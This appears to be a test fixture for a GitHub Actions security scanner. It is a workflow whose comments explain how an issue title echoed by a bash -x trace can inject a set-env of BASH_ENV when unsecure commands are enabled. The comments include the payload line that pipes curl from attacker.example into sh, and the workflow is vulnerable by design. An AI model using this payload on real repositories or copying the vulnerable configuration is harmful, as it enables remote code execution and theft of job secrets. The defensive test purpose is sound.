# situation: on issues, a job sets ACTIONS_ALLOW_UNSECURE_COMMANDS to true
#   in its env, and a step whose shell: is bash -x {0} passes the title of
#   the issue to git log; a step comes after.
# reason: bash -x starts the script with the trace on, as set -x does, so
#   the trace prints the command with the title on the standard error,
#   where the runner reads ##[set-env name=NAME;] anywhere in a line as a
#   command where the flag is true; the title is the attacker's, and a
#   set-env of BASH_ENV runs the attacker's code in the bash of the next
#   step.
# attack: the attacker opens an issue titled ##[set-env
#   name=BASH_ENV;]$(curl -s https://attacker.example/x | sh).
# attack-run-behavior: the trace prints the git log command with the title,
#   the runner sets BASH_ENV, and the bash of the next step runs the
#   attacker's script with the token and the secrets of the job.
on: workflow_call
permissions: {}
jobs:
  j:
    runs-on: ubuntu-latest
    env:
      ACTIONS_ALLOW_UNSECURE_COMMANDS: true
    steps:
      - shell: bash -x {0}
        env:
          TITLE: ${{ github.event.issue.title }}
        run: git log --grep "$TITLE" > log.txt
      - run: echo next
